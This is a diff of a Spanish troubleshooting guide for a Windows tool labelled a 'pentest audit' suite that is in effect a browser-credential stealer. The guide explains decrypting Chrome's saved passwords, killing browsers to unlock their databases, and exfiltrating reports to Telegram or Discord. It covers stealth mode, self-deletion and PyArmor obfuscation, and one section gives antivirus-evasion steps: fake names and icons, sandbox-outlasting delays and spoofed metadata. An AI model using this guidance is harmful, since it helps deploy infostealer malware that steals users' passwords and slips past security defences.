@@ -1,24 +1,23 @@
 # Solución de Problemas Comunes
 
-Este documento detalla los problemas frecuentes encontrados durante la compilación y ofuscación del proyecto y cómo resolverlos.
+Este documento detalla los problemas frecuentes encontrados durante la compilación, ofuscación y ejecución del proyecto, y cómo resolverlos.
+
+---
 
 ## 1. PyArmor: El término 'pyarmor' no se reconoce como nombre de comando
 
 ### Síntoma
-Intentas ejecutar `pyarmor` y recibes un mensaje de error indicando que no se reconoce el comando.
+Intentás ejecutar `pyarmor` y recibís un mensaje de error indicando que no se reconoce el comando.
 
 ### Causa
-Esto suele ocurrir por dos razones principales:
-1. El directorio de scripts de Python (ej. `C:\Python314\Scripts\`) no está correctamente agregado al PATH del sistema.
-2. La instalación de PyArmor prefirió el módulo CLI directo en lugar de crear un ejecutable global.
+Ocurre cuando el directorio de scripts de Python (ej. `C:\Python314\Scripts\`) no está en el PATH del sistema, o la instalación de PyArmor no creó un ejecutable global.
 
-### Solución (Mediante build.py)
-Para evitar errores manuales y problemas de PATH, usa el script de automatización incluido:
+### Solución
+Usá el Builder gráfico o el script de automatización incluido:
 ```powershell
 python build.py --name "NombreApp"
 ```
-
-Alternativamente, puedes usar el punto de entrada directo del módulo:
+Alternativamente, usá el punto de entrada directo del módulo:
 ```powershell
 python -m pyarmor.cli --version
 ```
@@ -28,140 +27,176 @@ python -m pyarmor.cli --version
 ## 2. Error de sintaxis en `pyarmor pack` (Incompatibilidad de Versión)
 
 ### Síntoma
-Recibes un error de argumentos o comandos desconocidos al intentar usar `pyarmor pack` como en versiones antiguas de tutoriales.
+Recibís un error de argumentos o comandos desconocidos al intentar usar `pyarmor pack`.
 
 ### Causa
-Has instalado **PyArmor 8.x o 9.x**, donde el flujo de empaquetado cambió drásticamente respecto a la versión 7. El comando `pack` ya no existe de la misma forma y los parámetros han sido reestructurados.
+**PyArmor 8.x o 9.x** cambió drásticamente el flujo de empaquetado respecto a la versión 7. El comando `pack` ya no existe igual.
 
 ### Solución para PyArmor 9+
-Debes usar el comando `gen --pack`. A continuación se muestra cómo lograr el equivalente a un `--onefile --noconsole`:
+Usá `gen --pack`:
+```powershell
+# Configurar opciones de PyInstaller
+python -m pyarmor.cli cfg pack:pyi_options="--onefile --noconsole --name SysHealth"
 
-1. **Configurar opciones de PyInstaller**:
-   Define el nombre del ejecutable y las configuraciones de consola en la configuración local de PyArmor:
-   ```powershell
-   python -m pyarmor.cli cfg pack:pyi_options="--onefile --noconsole --name SysHealth"
-   ```
-
-2. **Ejecutar el empaquetado**:
-   Genera el ejecutable pasando el parámetro `--pack`:
-   ```powershell
-   python -m pyarmor.cli gen --pack onefile main.py
-   ```
-
-3. **Verificación**:
-   El resultado aparecerá en la carpeta `dist/`. Ten en cuenta que si usas la versión **Trial**, existen límites en la complejidad de los scripts que puedes ofuscar.
+# Ejecutar el empaquetado
+python -m pyarmor.cli gen --pack onefile main.py
+```
+> La versión **Trial** tiene límites en la complejidad de los scripts que puede ofuscar.
 
 ---
 
 ## 3. El reporte no se envía (Error de Red)
 
 ### Síntoma
-El script finaliza pero no recibes el mensaje en Telegram o Discord.
-
-# Solución de Problemas Comunes
-
-Este documento detalla los problemas frecuentes encontrados durante la compilación y ofuscación del proyecto y cómo resolverlos.
-
-## 1. PyArmor: El término 'pyarmor' no se reconoce como nombre de comando
-
-### Síntoma
-Intentas ejecutar `pyarmor` y recibes un mensaje de error indicando que no se reconoce el comando.
-
-### Causa
-Esto suele ocurrir por dos razones principales:
-1. El directorio de scripts de Python (ej. `C:\Python314\Scripts\`) no está correctamente agregado al PATH del sistema.
-2. La instalación de PyArmor prefirió el módulo CLI directo en lugar de crear un ejecutable global.
-
-### Solución (Mediante build.py)
-Para evitar errores manuales y problemas de PATH, usa el script de automatización incluido:
-```powershell
-python build.py --name "NombreApp"
-```
-
-Alternativamente, puedes usar el punto de entrada directo del módulo:
-```powershell
-python -m pyarmor.cli --version
-```
-
----
-
-## 2. Error de sintaxis en `pyarmor pack` (Incompatibilidad de Versión)
-
-### Síntoma
-Recibes un error de argumentos o comandos desconocidos al intentar usar `pyarmor pack` como en versiones antiguas de tutoriales.
-
-### Causa
-Has instalado **PyArmor 8.x o 9.x**, donde el flujo de empaquetado cambió drásticamente respecto a la versión 7. El comando `pack` ya no existe de la misma forma y los parámetros han sido reestructurados.
-
-### Solución para PyArmor 9+
-Debes usar el comando `gen --pack`. A continuación se muestra cómo lograr el equivalente a un `--onefile --noconsole`:
-
-1. **Configurar opciones de PyInstaller**:
-   Define el nombre del ejecutable y las configuraciones de consola en la configuración local de PyArmor:
-   ```powershell
-   python -m pyarmor.cli cfg pack:pyi_options="--onefile --noconsole --name SysHealth"
-   ```
-
-2. **Ejecutar el empaquetado**:
-   Genera el ejecutable pasando el parámetro `--pack`:
-   ```powershell
-   python -m pyarmor.cli gen --pack onefile main.py
-   ```
-
-3. **Verificación**:
-   El resultado aparecerá en la carpeta `dist/`. Ten en cuenta que si usas la versión **Trial**, existen límites en la complejidad de los scripts que puedes ofuscar.
-
----
-
-## 3. El reporte no se envía (Error de Red)
-
-### Síntoma
-El script finaliza pero no recibes el mensaje en Telegram o Discord.
+El script finaliza pero no recibís el mensaje en Telegram o Discord.
 
 ### Causa
 Micro-cortes de internet, DNS inestable o bloqueo temporal (rate-limit) por parte de las APIs.
 
 ### Solución
-La suite implementa **resiliencia de red** automática con un decorador de reintentos (3 intentos con espera exponencial). Si después de 3 intentos falla, el script **no borrará** el archivo local (aunque no uses `--no-wipe`) para asegurar que no pierdas la auditoría. Puedes recuperar el reporte manualmente en la carpeta `.audit/`.
+La suite implementa **resiliencia de red** automática con reintentos (3 intentos con espera exponencial). Si falla después de 3 intentos, el archivo local **no se borrará** (aunque no uses `--no-wipe`) para evitar pérdida de datos. Recuperá el reporte manualmente en la carpeta `.audit/`.
 
 ---
 
 ## 4. La ventana de consola aparece brevemente al iniciar (Modo Stealth)
 
 ### Síntoma
-Al ejecutar el script o el `.exe` con el parámetro `-s` / `--stealth`, la ventana de comandos se ve un segundo antes de ocultarse.
+Al ejecutar el `.exe` con el parámetro `--stealth`, la ventana de comandos se ve un segundo antes de ocultarse.
 
-### Causa
-Se ha diferido el ocultamiento de la consola hasta después del análisis de argumentos e importación de módulos. Esto evita que, si falta una librería crítica (como `pywin32`) en la PC de destino, el script muera silenciosamente en segundo plano.
+### Causa y Distinción Técnica
+Hay **dos mecanismos de ocultamiento independientes**:
+
+| Mecanismo | Nivel | Cuándo actúa | Visible al inicio |
+| :--- | :--- | :--- | :--- |
+| **Mostrar Consola** (desmarcado) | Compilador | Nunca crea la ventana | ❌ Nunca |
+| **Modo Stealth** (`--stealth`) | Runtime | Después de importar módulos | ⚠️ Sí, ~1s |
 
 ### Solución
-Es un comportamiento de diseño para garantizar la robustez. Si deseas que sea 100% invisible desde el milisegundo cero, debes compilar usando `python build.py --noconsole`.
+Para sigilo total desde el milisegundo cero: compilá con **"Mostrar Consola" desmarcado** en el Builder (genera un `Windowed App`). El flag `--stealth` es una capa de seguridad extra cuando la ventana ya fue creada, pero no reemplaza la compilación en modo silencioso.
 
 ---
 
-## 5. Error "Permission Denied" al borrar logs o reportes
+## 5. Las contraseñas muestran símbolos raros o `[Error AES-GCM]`
+
+### Síntoma
+En el reporte HTML/CSV, el campo de contraseña muestra caracteres extraños, o valores como `[Error AES-GCM]`, `[Sin Llave AES]` o `[Sin Descifrar]`.
+
+### Causa
+Chromium usa **dos esquemas de cifrado diferentes** que pueden coexistir en la misma base de datos:
+
+1. **AES-GCM (v80+)**: Los blobs tienen el prefijo `v10` y requieren la master key del `Local State`.
+2. **DPAPI Legacy (<v80)**: Blobs cifrados directamente por Windows, sin prefijo.
+
+Los marcadores de error indican:
+
+| Marcador | Causa |
+| :--- | :--- |
+| `[Sin Llave AES]` | Blob `v10` pero no se pudo leer el `Local State`. |
+| `[Blob Inválido]` | El blob `v10` está truncado o corrupto. |
+| `[Error AES-GCM]` | La llave existe pero no descifra este blob (y DPAPI tampoco pudo). |
+| `[Sin Descifrar]` | Blob legacy sin prefijo que DPAPI no puede descifrar en esta sesión. |
+
+### Solución
+1. Ejecutá con permisos de **administrador** para garantizar que DPAPI pueda acceder a las claves del usuario actual.
+2. Si el navegador está abierto, usá **`--auto-kill`** para que la suite cierre el proceso y libere el bloqueo de la base de datos.
+3. Si ves `[Sin Llave AES]`, el `Local State` del perfil podría estar corrupto o pertenecer a otro usuario de Windows.
+
+---
+
+## 6. Error "Permission Denied" al borrar logs o reportes
 
 ### Síntoma
 El Dashboard o el script fallan al intentar limpiar la carpeta `.audit/` o el archivo `pentest_audit.log`.
 
 ### Causa
-Windows bloquea los archivos que están siendo escritos por otro proceso. Si la auditoría falló a mitad de camino, es posible que el manejador de logs (logger) haya quedado abierto y bloqueando el archivo.
+Windows bloquea archivos que otro proceso está escribiendo. Si una auditoría falló a mitad de camino, el manejador de logs puede haber quedado abierto.
 
 ### Solución
-1. Asegúrate de que no haya otra instancia de la suite ejecutándose en segundo plano (revisa el Administrador de Tareas).
-2. La versión **1.3.0** incluye un "Logger Guard" que cierra automáticamente los flujos antes de intentar borrar. Si el problema persiste, reinicia la aplicación.
+1. Asegurate de que no haya otra instancia corriendo (revisá el Administrador de Tareas).
+2. La suite incluye un "Logger Guard" que cierra flujos antes de intentar borrar. Si el problema persiste, reiniciá la aplicación.
 
 ---
 
-## 6. La Autodestrucción no borró el .exe
+## 7. La Autodestrucción no borró el .exe
 
 ### Síntoma
 Activaste `--self-destruct` pero el archivo sigue en la carpeta después de la ejecución.
 
 ### Causa
-El comando `del` de Windows puede fallar si el archivo está siendo "observado" o bloqueado por:
-1. El Explorador de Windows (si tienes la carpeta abierta y seleccionaste el archivo).
-2. Un Antivirus que está escaneando el binario justo en ese momento.
+El comando `del` de Windows puede fallar si el archivo está bloqueado por:
+1. El Explorador de Windows (si tenés la carpeta abierta y seleccionaste el archivo).
+2. Un Antivirus que está escaneando el binario en ese momento.
 
 ### Solución
-Espera unos segundos. El comando tiene un delay de 3 segundos para permitir que el proceso principal muera del todo antes de borrarse. Evita tener la carpeta de salida abierta en el explorador durante el testeo.
+Esperá unos segundos. El comando tiene un delay de 3s para permitir que el proceso principal termine antes de borrarse. Evitá tener la carpeta de salida abierta en el explorador durante el testeo.
+
+---
+
+## 8. Chrome no detecta perfiles aunque están instalados (`0 perfiles encontrados`)
+
+### Síntoma
+El log muestra `Encontrados 0 perfiles para procesar.` pero tenés Chrome instalado y con contraseñas guardadas.
+
+### Causa Posible 1 — Perfil no detectado por nombre
+El detector busca carpetas llamadas `Default`, `Guest Profile`, o `Profile N`. Si tu perfil tiene otro nombre (raro, pero posible en instalaciones modificadas), no se encuentra.
+
+### Causa Posible 2 — Base de datos vacía
+La suite valida que el archivo `Login Data` tenga `size > 0`. Un perfil recién creado o sin contraseñas guardadas tiene la BD vacía y se descarta.
+
+### Causa Posible 3 — Navegador bloqueando la BD
+Chrome tiene un bloqueo exclusivo sobre `Login Data` mientras está corriendo.
+
+### Solución
+- Activá **`--auto-kill`** (o la opción equivalente en el Builder) para cerrar el navegador antes de auditar.
+- Verificá manualmente que la carpeta `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` exista y no esté vacía.
+
+---
+
+## 9. Error "Database is locked" (SQLite)
+
+### Síntoma
+Incluso usando `--auto-kill`, el log muestra que la base de datos `Login Data` está bloqueada y no se puede copiar.
+
+### Causa
+Esto suele ocurrir cuando un servicio de sincronización en la nube (como **OneDrive**, **Google Drive** o **Dropbox**) está intentando respaldar el perfil del navegador en ese preciso instante, manteniendo un handle abierto sobre el archivo.
+
+### Solución
+1. Pausá temporalmente la sincronización de archivos en la nube.
+2. Si el problema persiste, revisá que no haya procesos "huérfanos" de Chrome o Edge en el Administrador de Tareas que `--auto-kill` no haya podido terminar (sucede a veces con subprocesos de extensiones).
+
+---
+
+## 10. Detección por Heurística (Falsos Positivos de AV)
+
+### Síntoma
+Tu binario ofuscado y firmado es borrado por el Antivirus inmediatamente después de generarse o al intentar ejecutarlo.
+
+### Causa
+La combinación de **empaquetado (PyInstaller)** + **ofuscación (PyArmor)** + **comportamiento de red (Webhooks)** es un patrón que los AV marcan como sospechoso por defecto (detección heurística).
+
+### Solución
+1. **No uses el nombre por defecto**: Cambiá el nombre del archivo a algo genérico como `WinSystemTray.exe`.
+2. **Cambiá el Icono**: Usar el icono por defecto de Python es una bandera roja inmediata. Usá uno de una aplicación conocida.
+3. **Aumentá el Delay Inicial**: Configurá un delay de al menos 30-60 segundos en el Builder. Muchos sandboxes de AV se rinden si no ven actividad en los primeros segundos.
+4. **Spoofing de Metadatos**: Asegurate de completar los campos de Versión, Compañía y Descripción en el Builder para que el binario parezca legítimo.
+
+---
+
+## 11. El Dashboard no abre (ModuleNotFoundError)
+
+### Síntoma
+Al ejecutar `python gui_app.py`, recibís un error diciendo que no se encuentra el módulo `customtkinter` o `PIL`.
+
+### Causa
+Faltan las dependencias de la interfaz gráfica en tu entorno actual.
+
+### Solución
+Instalá el set completo de dependencias:
+```powershell
+pip install -r requirements.txt
+```
+Si el error persiste específicamente con `PIL` (Pillow), reinstalalo manualmente:
+```powershell
+pip install --force-reinstall Pillow
+```
+
